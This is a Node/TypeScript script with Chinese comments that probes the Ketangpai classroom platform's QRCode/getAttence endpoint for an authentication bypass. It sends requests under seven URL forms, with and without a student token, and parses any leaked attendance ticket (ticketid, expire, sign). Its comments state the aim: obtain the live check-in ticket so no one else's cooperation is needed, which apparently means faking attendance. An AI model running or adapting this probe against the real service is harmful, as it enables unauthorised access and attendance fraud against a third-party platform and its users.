/**
 * 探测 QRCode/getAttence 这个 GET 页面是否「不带 token 也能拿到票据」。
 *
 * 线索：getQrCode 返回体里除了 mobileCheckInUrl，还有一个 qrcode 字段：
 *   https://openapiv5.ketangpai.com/QRCode/getAttence/ticketid/<t>/expire/<e>/sign/<s>.html
 * 这种 .html 是给 <img src> 用的，没法带自定义 token 头，
 * 所以它要么完全不鉴权、要么只认 ticket 参数。只要能换一种参数形式
 * （比如只给 attenceid）拿到当前票据，就彻底不需要人配合了。
 *
 * 用法: node tools/exp-qrcode-get.mjs [attenceid]
 */
import { readFileSync } from "node:fs";
import path from "node:path";
import { BASE_HEADERS } from "../src/constants.ts";
import { httpRequest } from "../src/http.ts";
import { getCachedToken, ROOT_DIR } from "../src/config.ts";

function loadDemo() {
  try {
    return JSON.parse(readFileSync(path.join(ROOT_DIR, ".cache", "demo-attence.json"), "utf8"));
  } catch {
    return {};
  }
}

const demo = loadDemo();
const attenceid = process.argv[2] ?? demo.attenceid;
const courseid = demo.courseid ?? "FAKEid0002";
if (!attenceid) {
  console.error("没有 attenceid，先跑 node tools/demo.ts create");
  process.exit(1);
}

const stuToken = getCachedToken("stu");
const BASE = "https://openapiv5.ketangpai.com/QRCode/getAttence";

const urls = [
  `${BASE}/${attenceid}.html`,
  `${BASE}/attenceid/${attenceid}.html`,
  `${BASE}/id/${attenceid}.html`,
  `${BASE}/courseid/${courseid}.html`,
  "https://openapiv5.ketangpai.com/QRCode/getAttence.html",
  "https://openapiv5.ketangpai.com/QRCode/getAttence",
  `${BASE}/.html`,
];

console.log(`attenceid = ${attenceid}\n课程     = ${courseid}\n`);
console.log("=".repeat(78));

let leaked = 0;

for (const url of urls) {
  for (const withToken of [false, true]) {
    const headers = { ...BASE_HEADERS, Accept: "text/html,application/json,*/*" };
    if (withToken && stuToken) headers.token = stuToken;

    let status = 0;
    let body = "";
    try {
      const res = await httpRequest(url, { method: "GET", headers, retries: 0, timeoutMs: 15_000 });
      status = res.status;
      body = res.body;
    } catch (err) {
      body = `ERR ${err instanceof Error ? err.message : String(err)}`;
    }

    const hasTicket = /ticketid/i.test(body) && /sign/i.test(body);
    if (hasTicket) leaked++;
    console.log(
      `${String(status).padEnd(4)} token=${withToken ? "Y" : "N"} len=${String(body.length).padStart(6)} ${url.replace(BASE, "...")}${hasTicket ? "  <<<<< 泄露票据!!!" : ""}`,
    );
    if (hasTicket) {
      const m = body.match(/ticketid[=/](\w+)[^\w]*expire[=/](\d+)[^\w]*sign[=/](\w+)/i);
      console.log(`      -> ticketid=${m?.[1]} expire=${m?.[2]} sign=${m?.[3]?.slice(0, 16)}...`);
    } else if (status === 200 && body.length < 400) {
      console.log(`      内容: ${body.replace(/\s+/g, " ").slice(0, 150)}`);
    }
  }
}

console.log("=".repeat(78));
console.log(leaked > 0 ? `\n发现 ${leaked} 个不鉴权就能拿票据的入口！` : "\n结论: 这条 GET 路径也拿不到票据。");
